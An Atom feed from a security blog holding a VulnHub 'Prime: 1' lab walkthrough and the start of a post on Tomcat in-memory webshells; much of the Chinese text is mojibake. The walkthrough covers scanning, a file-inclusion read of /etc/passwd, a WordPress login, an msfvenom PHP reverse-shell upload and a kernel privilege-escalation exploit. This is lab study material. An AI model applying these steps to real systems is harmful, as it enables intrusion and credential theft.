<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Gu0f3n&#39;s blog</title>
  
  <subtitle>é‚®ç”µéƒ¨è¯—äºº</subtitle>
  <link href="https://gu0f3n.github.io/atom.xml" rel="self"/>
  
  <link href="https://gu0f3n.github.io/"/>
  <updated>2025-03-31T14:22:36.267Z</updated>
  <id>https://gu0f3n.github.io/</id>
  
  <author>
    <name>Gu0f3n</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Prime: 1</title>
    <link href="https://gu0f3n.github.io/2025/03/31/Prime-1/"/>
    <id>https://gu0f3n.github.io/2025/03/31/Prime-1/</id>
    <published>2025-03-31T11:43:46.000Z</published>
    <updated>2025-03-31T14:22:36.267Z</updated>
    
    <content type="html"><![CDATA[<h1 id="ä¿¡æ¯æ”¶é›†"><a href="#ä¿¡æ¯æ”¶é›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†"></a>ä¿¡æ¯æ”¶é›†</h1><h2 id="ç¡®å®šä¸»æœºä½ç½®"><a href="#ç¡®å®šä¸»æœºä½ç½®" class="headerlink" title="ç¡®å®šä¸»æœºä½ç½®"></a>ç¡®å®šä¸»æœºä½ç½®</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> nmap -sn 192.168.205.0/24</span>                                          </span><br><span class="line">[sudo] kali çš„å¯†ç ï¼š</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 07:49 EDT</span><br><span class="line">Nmap scan report for 192.168.205.1 (192.168.205.1)</span><br><span class="line">Host is up (0.00058s latency).</span><br><span class="line">MAC Address: 00:50:56:C0:00:01 (VMware)</span><br><span class="line">Nmap scan report for 192.168.205.2 (192.168.205.2)</span><br><span class="line">Host is up (0.00014s latency).</span><br><span class="line">MAC Address: 00:50:56:F7:4F:9C (VMware)</span><br><span class="line">Nmap scan report for 192.168.205.137 (192.168.205.137)</span><br><span class="line">Host is up (0.00039s latency).</span><br><span class="line">MAC Address: 00:0C:29:32:80:FE (VMware)</span><br><span class="line">Nmap scan report for 192.168.205.254 (192.168.205.254)</span><br><span class="line">Host is up (0.00029s latency).</span><br><span class="line">MAC Address: 00:50:56:FD:69:37 (VMware)</span><br><span class="line">Nmap scan report for 192.168.205.128 (192.168.205.128)</span><br><span class="line">Host is up.</span><br><span class="line">Nmap done: 256 IP addresses (5 hosts up) scanned in 1.97 seconds</span><br></pre></td></tr></table></figure><p>or</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> arp-scan -l</span>              </span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:e7:49:b2, IPv4: 192.168.205.128</span><br><span class="line">Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.205.1   00:50:56:c0:00:01       VMware, Inc.</span><br><span class="line">192.168.205.2   00:50:56:f7:4f:9c       VMware, Inc.</span><br><span class="line">192.168.205.137 00:0c:29:32:80:fe       VMware, Inc.</span><br><span class="line">192.168.205.254 00:50:56:fd:69:37       VMware, Inc.</span><br><span class="line"></span><br><span class="line">4 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.10.0: 256 hosts scanned in 1.998 seconds (128.13 hosts/sec). 4 responded</span><br></pre></td></tr></table></figure><p>ç¡®å®š137æ˜¯æˆ‘ä»¬çš„ç›®æ ‡ä¸»æœº</p><p>é¦–å…ˆè¿›è¡Œtcpæ‰«æç„¶åä¿å­˜</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT --min-rate 10000 -p- 192.168.205.137 -oA nmapscan/tcp</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 07:53 EDT</span><br><span class="line">Nmap scan report for 192.168.205.137 (192.168.205.137)</span><br><span class="line">Host is up (0.0011s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">MAC Address: 00:0C:29:32:80:FE (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 0.18 seconds</span><br></pre></td></tr></table></figure><p>å‘ç°ä¸¤ä¸ªç«¯å£æ‰“å¼€ è¿™é‡Œä¸ºäº†ä¿æŒå¥½ä¹ æƒ¯ å‡è®¾ç¢°ä¸Šå¤šä¸ªç«¯å£çš„è¯ï¼ˆåªæ˜¯è¿›è¡Œç»ƒä¹ ï¼‰</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">grep open nmapscan/tcp.nmap|awk -F&#x27;/&#x27; &#x27;&#123;print($1)&#125;&#x27;|paste -sd &quot;,&quot;</span><br><span class="line"></span><br><span class="line">22,80</span><br></pre></td></tr></table></figure><p>å¯¹è¿™ä¸ªè¿ä¸ªç«¯å£è¿›è¡Œå…¨é¢æ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo nmap -sT -sV -sC -O -p22,80 192.168.205.137 -oA nmapscan/web                        </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 07:57 EDT</span><br><span class="line">Nmap scan report for 192.168.205.137 (192.168.205.137)</span><br><span class="line">Host is up (0.00092s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 8d:c5:20:23:ab:10:ca:de:e2:fb:e5:cd:4d:2d:4d:72 (RSA)</span><br><span class="line">|   256 94:9c:f8:6f:5c:f1:4c:11:95:7f:0a:2c:34:76:50:0b (ECDSA)</span><br><span class="line">|_  256 4b:f6:f1:25:b6:13:26:d4:fc:9e:b0:72:9f:f4:69:68 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))</span><br><span class="line">|_http-server-header: Apache/2.4.18 (Ubuntu)</span><br><span class="line">|_http-title: HacknPentest</span><br><span class="line">MAC Address: 00:0C:29:32:80:FE (VMware)</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>äºæ­¤åŒæ—¶å‘ç°å¯¹udpç«¯å£è¿›è¡Œæ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> nmap -sU --top-ports 20 192.168.205.137 -oA nmapscan/udp</span></span><br><span class="line">[sudo] kali çš„å¯†ç ï¼š</span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 07:59 EDT</span><br><span class="line">Nmap scan report for 192.168.205.137 (192.168.205.137)</span><br><span class="line">Host is up (0.00086s latency).</span><br><span class="line"></span><br><span class="line">PORT      STATE         SERVICE</span><br><span class="line">53/udp    closed        domain</span><br><span class="line">67/udp    closed        dhcps</span><br><span class="line">68/udp    open|filtered dhcpc</span><br><span class="line">69/udp    closed        tftp</span><br><span class="line">123/udp   closed        ntp</span><br><span class="line">135/udp   closed        msrpc</span><br><span class="line">137/udp   closed        netbios-ns</span><br><span class="line">138/udp   closed        netbios-dgm</span><br><span class="line">139/udp   closed        netbios-ssn</span><br><span class="line">161/udp   closed        snmp</span><br><span class="line">162/udp   closed        snmptrap</span><br><span class="line">445/udp   closed        microsoft-ds</span><br><span class="line">500/udp   closed        isakmp</span><br><span class="line">514/udp   closed        syslog</span><br><span class="line">520/udp   closed        route</span><br><span class="line">631/udp   open|filtered ipp</span><br><span class="line">1434/udp  closed        ms-sql-m</span><br><span class="line">1900/udp  closed        upnp</span><br><span class="line">4500/udp  closed        nat-t-ike</span><br><span class="line">49152/udp closed        unknown</span><br><span class="line">MAC Address: 00:0C:29:32:80:FE (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 23.42 seconds</span><br></pre></td></tr></table></figure><p>631&#x2F;udp   open|filtered ipp</p><p>68&#x2F;udp    open|filtered dhcpc</p><p>å‘ç°å¯èƒ½æ‰“å¼€çš„ä¸¤ä¸ªç«¯å£</p><p>ç”¨è„šæœ¬æ‰«æç«¯å£æ¼æ´äºæ­¤åŒæ—¶å¯¹æ‰“å¼€çš„80ç«¯å£è¿›è¡Œç›®å½•æ‰«æ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> nmap --script=vuln -p80,22 192.168.205.137 -oA nmapscan/vuln</span>   </span><br><span class="line">Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-31 08:04 EDT</span><br><span class="line">Nmap scan report for 192.168.205.137 (192.168.205.137)</span><br><span class="line">Host is up (0.00042s latency).</span><br><span class="line"></span><br><span class="line">PORT   STATE SERVICE</span><br><span class="line">22/tcp open  ssh</span><br><span class="line">80/tcp open  http</span><br><span class="line">|_http-vuln-cve2017-1001000: ERROR: Script execution failed (use -d to debug)</span><br><span class="line">|_http-stored-xss: Couldn&#x27;t find any stored XSS vulnerabilities.</span><br><span class="line">|_http-dombased-xss: Couldn&#x27;t find any DOM based XSS.</span><br><span class="line">|_http-csrf: Couldn&#x27;t find any CSRF vulnerabilities.</span><br><span class="line">| http-enum: </span><br><span class="line">|   /wordpress/: Blog</span><br><span class="line">|_  /wordpress/wp-login.php: Wordpress login page.</span><br><span class="line">MAC Address: 00:0C:29:32:80:FE (VMware)</span><br><span class="line"></span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 174.19 seconds</span><br></pre></td></tr></table></figure><p>ç›®å½•æ‰«æç»“æœ</p><p>[08:06:03] 200 -  131B  - &#x2F;dev<br>[08:06:06] 200 -  137B  - &#x2F;image.php</p><p>[08:06:18] 200 -    1KB - &#x2F;wordpress&#x2F;wp-login.php<br>[08:06:18] 200 -    4KB - &#x2F;wordpress&#x2F;</p><p>é¦–å…ˆè®¿é—®ä¸‹&#x2F;dev</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> curl 192.168.205.137/dev</span></span><br><span class="line">hello,</span><br><span class="line"></span><br><span class="line">now you are at level 0 stage.</span><br><span class="line"></span><br><span class="line">In real life pentesting we should use our tools to dig on a web very hard.</span><br><span class="line"></span><br><span class="line">Happy hacking. </span><br></pre></td></tr></table></figure><p>ä¸€äº›æç¤ºå‘Šè¯‰æˆ‘ä»¬è¦ä½¿ç”¨å·¥å…·æ¥å¯¹webè¿›è¡Œæ¸—é€</p><p>é‚£ä¹ˆæˆ‘ä»¬è¿›ä¸€æ­¥å¯¹webè¿›è¡Œwebçœ‹æœ‰æ²¡æ–‡ä»¶é—ç•™</p><p>è¿™é‡Œä½¿ç”¨dirb</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dirb http://192.168.205.137 -X .zip,.txt -o nmapscan</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">DIRB v2.22    </span><br><span class="line"></span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">OUTPUT_FILE: nmapscan/file</span><br><span class="line">START_TIME: Mon Mar 31 08:36:15 2025</span><br><span class="line">URL_BASE: http://192.168.205.137/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.zip,.txt) | (.zip)(.txt) [NUM = 2]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612                                        </span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.205.137/ ----</span><br><span class="line"></span><br><span class="line">+ http://192.168.205.137/secret.txt (CODE:200|SIZE:412)      </span><br><span class="line">                                                             </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">END_TIME: Mon Mar 31 08:36:21 2025</span><br><span class="line">DOWNLOADED: 9224 - FOUND: 1</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æœ‰æ–°çš„ç»“æœ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl 192.168.205.137/secret.txt</span><br><span class="line">Looks like you have got some secrets.</span><br><span class="line"></span><br><span class="line">Ok I just want to do some help to you. </span><br><span class="line"></span><br><span class="line">Do some more fuzz on every page of php which was finded by you. And if</span><br><span class="line">you get any right parameter then follow the below steps. If you still stuck </span><br><span class="line">Learn from here a basic tool with good usage for OSCP.</span><br><span class="line"></span><br><span class="line">https://github.com/hacknpentest/Fuzzing/blob/master/Fuzz_For_Web</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//see the location.txt and you will get your next move//</span><br></pre></td></tr></table></figure><p>æ ¹æ®æç¤ºå¯¹å·²ç»æ‰¾åˆ°çš„phpè¿›è¡Œfuzz,</p><p>é‚£ç»§ç»­dirbæ‰¾php</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo dirb http://192.168.205.137 -X .php -o nmapscan/file</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">DIRB v2.22    </span><br><span class="line"></span><br><span class="line">By The Dark Raver</span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">OUTPUT_FILE: nmapscan/file</span><br><span class="line">START_TIME: Mon Mar 31 08:48:03 2025</span><br><span class="line">URL_BASE: http://192.168.205.137/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line">EXTENSIONS_LIST: (.php) | (.php) [NUM = 1]</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">                                                             GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.205.137/ ----</span><br><span class="line">                                                             + http://192.168.205.137/image.php (CODE:200|SIZE:147)      </span><br><span class="line"></span><br><span class="line">+ http://192.168.205.137/index.php (CODE:200|SIZE:136)      </span><br><span class="line">                                                                               </span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">END_TIME: Mon Mar 31 08:48:06 2025</span><br><span class="line">DOWNLOADED: 4612 - FOUND: 2</span><br></pre></td></tr></table></figure><p>å¯¹index.phpè¿›è¡Œfuzz</p><p>å‘ç°file</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo wfuzz -c -w /usr/share/wfuzz/wordlist/general/common.txt --hh 136 http://192.168.205.137/index.php?FUZZ=something</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz&#x27;s documentation for more information.</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line"></span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.205.137/index.php?FUZZ=something</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                     </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000341:   200        7 L      19 W       206 Ch      &quot;file&quot;                                                      </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 951</span><br><span class="line">Filtered Requests: 950</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo curl http://192.168.205.137/index.php?file                                                                                 </span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">Do something better &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;you are digging wrong file&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>æç¤ºæˆ‘ä»¬æŒ–çš„æ–‡ä»¶é”™è¯¯</p><p>æ ¹æ®ä¸Šé¢çš„æç¤ºæˆ‘ä»¬éœ€è¦è®¿é—®location.txt</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash"><span class="built_in">sudo</span> curl http://192.168.205.137/index.php?file=location.txt</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line"></span><br><span class="line">Do something better &lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;ok well Now you reah at the exact parameter &lt;br&gt;&lt;br&gt;Now dig some more for next one &lt;br&gt;use &#x27;secrettier360&#x27; parameter on some other php page for more fun.</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>å‘Šè¯‰æˆ‘ä»¬åœ¨å…¶ä»–phpæ–‡ä»¶ä¸­ç”¨å‚æ•°secrettier360è¿›è¡Œæµ‹è¯•</p><p>è®¿é—®ä¹‹å‰çš„image.phpè¯•è¯•æŠŠ</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"> sudo curl http://192.168.205.137/image.php?secrettier360=</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;title&gt;HacknPentest&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;img src=&#x27;hacknpentest.png&#x27; alt=&#x27;hnp security&#x27; width=&quot;1300&quot; height=&quot;595&quot; /&gt;&lt;/p&gt;&lt;/p&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">finaly you got the right parameter&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;/html&gt;</span><br><span class="line">                                                           </span><br></pre></td></tr></table></figure><p><a href="http://192.168.205.137/image.php?secrettier360=/etc/passwd">http://192.168.205.137/image.php?secrettier360=/etc/passwd</a></p><p>å¯ä»¥å‘ç°è¿™ä¸ªå‚æ•°å­˜åœ¨æ–‡ä»¶åŒ…å«</p><p>å¯ä»¥çœ‹åˆ°ä¸€ä¸ªrootç”¨æˆ·å’Œä¸€ä¸ªvictorç”¨æˆ·åº”è¯¥æ˜¯å¯ä»¥åˆ©ç”¨çš„</p><p>åŒæ—¶å‘ç°</p><p>saket:x:1001:1001:find password.txt file in my directory:&#x2F;home&#x2F;saket:</p><p><a href="http://192.168.205.137/image.php?secrettier360=/home/saket/password.txt">http://192.168.205.137/image.php?secrettier360=/home/saket/password.txt</a></p><p>follow_the_ippsec</p><p>åº”è¯¥æ˜¯å¯†ç æˆ‘ä»¬ç”¨sshå°è¯•ç™»å½•victor</p><p>å¥½å§ä¸æ˜¯</p><p>è¯•ä¸€è¯•wordpressçš„ç™»å½•é¡µé¢</p><p>æˆåŠŸï¼</p><p>victor:follow_the_ippsec</p><p>ç™»å½•åˆ°åå°</p><p>å‘ç°ç‰ˆæœ¬å·WordPress 6.7.2 </p><p>æŸ¥çœ‹æ¼æ´åˆ©ç”¨</p><p>åœ¨ä¸»é¢˜è¿™é‡Œçš„secret.phpæ˜¯å¯ä»¥è¿›è¡Œä¸Šä¼ shellçš„</p><p>æˆ‘ä»¬ç”¨</p><p>msfvenom -p php&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.205.128 LPORT&#x3D;7777  -o mshell.php</p><p>ç”Ÿæˆshell ç„¶åæŠŠé‡Œé¢å†…å®¹ä¼ åˆ°secret.phpé‡Œé¢</p><p>msfconsoleè¿›è¡Œåå¼¹shell</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">Matching Defaults entries for www-data on ubuntu:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User www-data may run the following commands on ubuntu:</span><br><span class="line">    (root) NOPASSWD: /home/saket/enc</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cd</span><br><span class="line">cd /home</span><br><span class="line">ls</span><br><span class="line">saket</span><br><span class="line">victor</span><br><span class="line">cd saket </span><br><span class="line">ls</span><br><span class="line">enc</span><br><span class="line">password.txt</span><br><span class="line">user.txt</span><br><span class="line">cat user.txt</span><br><span class="line">af3c658dcf9d7190da3153519c003456</span><br></pre></td></tr></table></figure><p>ç°è·å¾—ä¸€ä¸ªflag</p><p>uname -a<br>Linux ubuntu 4.10.0-28-generic #32~16.04.2-Ubuntu SMP Thu Jul 20 10:19:48 UTC 2017 x86_64 x86_64 x86_64 G</p><p>æŸ¥çœ‹å†…æ ¸å‘ç°å†…æ ¸ç‰ˆæœ¬æ¯”è¾ƒä½ çœ‹èƒ½å¦è¿›è¡Œå†…æ ¸ææƒ</p><p>ä¸‹è½½45010 ç„¶åæœ¬åœ°èµ·ä¸€ä¸ªhttpæœåŠ¡</p><p>é¶æœºè¿™è¾¹å¯ä»¥åˆ©ç”¨wget è¿›è¡Œä¸‹è½½ éœ€è¦åˆ°é¶æœºé‡Œé¢è¿›è¡Œç¼–è¯‘ç„¶åå³å¯æˆåŠŸææƒ </p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cat root.txt</span><br><span class="line">b2b17036da1de94cfb024540a8e7075a</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æ”¶é›†&quot; class=&quot;headerlink&quot; title=&quot;ä¿¡æ¯æ”¶é›†&quot;&gt;&lt;/a&gt;ä¿¡æ¯æ”¶é›†&lt;/h1&gt;&lt;h2 id=&quot;ç¡®å®šä¸»æœºä½ç½®&quot;&gt;&lt;a href=&quot;#ç¡®å®šä¸»æœºä½ç½®&quot; class=&quot;headerlink&quot; title=&quot;ç¡®å®šä¸»æœºä½</summary>
      
    
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/categories/vulnhub/"/>
    
    
    <category term="vulnhub" scheme="https://gu0f3n.github.io/tags/vulnhub/"/>
    
  </entry>
  
  <entry>
    <title>Tomcatå†…å­˜é©¬</title>
    <link href="https://gu0f3n.github.io/2025/03/30/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/"/>
    <id>https://gu0f3n.github.io/2025/03/30/Tomcat%E5%86%85%E5%AD%98%E9%A9%AC/</id>
    <published>2025-03-30T03:12:48.000Z</published>
    <updated>2025-03-30T08:27:02.635Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Tomcat-Servlet"><a href="#Tomcat-Servlet" class="headerlink" title="Tomcat-Servlet"></a>Tomcat-Servlet</h1><p>é¦–å…ˆå›é¡¾ä¸‹Tomcatä¸Servletçš„å…³ç³»</p><p>fromï¼š<a href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Servlet%E5%9E%8B/</a></p><p>Tomcatç”±å››å¤§å®¹å™¨ç»„æˆï¼Œåˆ†åˆ«æ˜¯Engineã€Hostã€Contextã€Wrapperã€‚è¿™å››ä¸ªç»„ä»¶æ˜¯è´Ÿè´£å…³ç³»ï¼Œå­˜åœ¨åŒ…å«å…³ç³»ã€‚åªåŒ…å«ä¸€ä¸ªå¼•æ“ï¼ˆEngineï¼‰ï¼š</p><blockquote><p>Engineï¼ˆå¼•æ“ï¼‰ï¼šè¡¨ç¤ºå¯è¿è¡Œçš„Catalinaçš„servletå¼•æ“å®ä¾‹ï¼Œå¹¶ä¸”åŒ…å«äº†servletå®¹å™¨çš„æ ¸å¿ƒåŠŸèƒ½ã€‚åœ¨ä¸€ä¸ªæœåŠ¡ä¸­åªèƒ½æœ‰ä¸€ä¸ªå¼•æ“ã€‚åŒæ—¶ï¼Œä½œä¸ºä¸€ä¸ªçœŸæ­£çš„å®¹å™¨ï¼ŒEngineå…ƒç´ ä¹‹ä¸‹å¯ä»¥åŒ…å«ä¸€ä¸ªæˆ–å¤šä¸ªè™šæ‹Ÿä¸»æœºã€‚å®ƒä¸»è¦åŠŸèƒ½æ˜¯å°†ä¼ å…¥è¯·æ±‚å§”æ‰˜ç»™é€‚å½“çš„è™šæ‹Ÿä¸»æœºå¤„ç†ã€‚å¦‚æœæ ¹æ®åç§°æ²¡æœ‰æ‰¾åˆ°å¯å¤„ç†çš„è™šæ‹Ÿä¸»æœºï¼Œé‚£ä¹ˆå°†æ ¹æ®é»˜è®¤çš„Hostæ¥åˆ¤æ–­è¯¥ç”±å“ªä¸ªè™šæ‹Ÿä¸»æœºå¤„ç†ã€‚</p><p>Host ï¼ˆè™šæ‹Ÿä¸»æœºï¼‰ï¼šä½œç”¨å°±æ˜¯è¿è¡Œå¤šä¸ªåº”ç”¨ï¼Œå®ƒè´Ÿè´£å®‰è£…å’Œå±•å¼€è¿™äº›åº”ç”¨ï¼Œå¹¶ä¸”æ ‡è¯†è¿™ä¸ªåº”ç”¨ä»¥ä¾¿èƒ½å¤ŸåŒºåˆ†å®ƒä»¬ã€‚å®ƒçš„å­å®¹å™¨é€šå¸¸æ˜¯ Contextã€‚ä¸€ä¸ªè™šæ‹Ÿä¸»æœºä¸‹éƒ½å¯ä»¥éƒ¨ç½²ä¸€ä¸ªæˆ–è€…å¤šä¸ªWeb Appï¼Œæ¯ä¸ªWeb Appå¯¹åº”äºä¸€ä¸ªContextï¼Œå½“Hostè·å¾—ä¸€ä¸ªè¯·æ±‚æ—¶ï¼Œå°†æŠŠè¯¥è¯·æ±‚åŒ¹é…åˆ°æŸä¸ªContextä¸Šï¼Œç„¶åæŠŠè¯¥è¯·æ±‚äº¤ç»™è¯¥Contextæ¥å¤„ç†ã€‚ä¸»æœºç»„ä»¶ç±»ä¼¼äºApacheä¸­çš„è™šæ‹Ÿä¸»æœºï¼Œä½†åœ¨Tomcatä¸­åªæ”¯æŒåŸºäºFQDN(å®Œå…¨åˆæ ¼çš„ä¸»æœºå)çš„â€œè™šæ‹Ÿä¸»æœºâ€ã€‚Hostä¸»è¦ç”¨æ¥è§£æweb.xml</p><p>Contextï¼ˆä¸Šä¸‹æ–‡ï¼‰ï¼šä»£è¡¨ Servlet çš„ Contextï¼Œå®ƒå…·å¤‡äº† Servlet è¿è¡Œçš„åŸºæœ¬ç¯å¢ƒï¼Œå®ƒè¡¨ç¤ºWebåº”ç”¨ç¨‹åºæœ¬èº«ã€‚Context æœ€é‡è¦çš„åŠŸèƒ½å°±æ˜¯ç®¡ç†å®ƒé‡Œé¢çš„ Servlet å®ä¾‹ï¼Œä¸€ä¸ªContextä»£è¡¨ä¸€ä¸ªWebåº”ç”¨ï¼Œä¸€ä¸ªWebåº”ç”¨ç”±ä¸€ä¸ªæˆ–è€…å¤šä¸ªServletå®ä¾‹ç»„æˆã€‚</p><p>Wrapperï¼ˆåŒ…è£…å™¨ï¼‰ï¼šä»£è¡¨ä¸€ä¸ª Servletï¼Œå®ƒè´Ÿè´£ç®¡ç†ä¸€ä¸ª Servletï¼ŒåŒ…æ‹¬çš„ Servlet çš„è£…è½½ã€åˆå§‹åŒ–ã€æ‰§è¡Œä»¥åŠèµ„æºå›æ”¶ã€‚Wrapper æ˜¯æœ€åº•å±‚çš„å®¹å™¨ï¼Œå®ƒæ²¡æœ‰å­å®¹å™¨äº†ï¼Œæ‰€ä»¥è°ƒç”¨å®ƒçš„ addChild å°†ä¼šæŠ¥é”™ã€‚</p></blockquote><p>æˆ‘è¿˜æ˜¯ç”¨å¤§ç™½è¯æ›´å¥½ç†è§£è¿™ä¸ªæ¯”è¾ƒæŠ½è±¡çš„æ¦‚å¿µ</p><p>ç”¨ <strong>ã€Œå¿«é€’å…¬å¸ã€</strong> çš„æ¯”å–»ç§’æ‡‚è¿™å››ä¸ªç»„ä»¶çš„å…³ç³»ğŸ‘‡</p><hr><h3 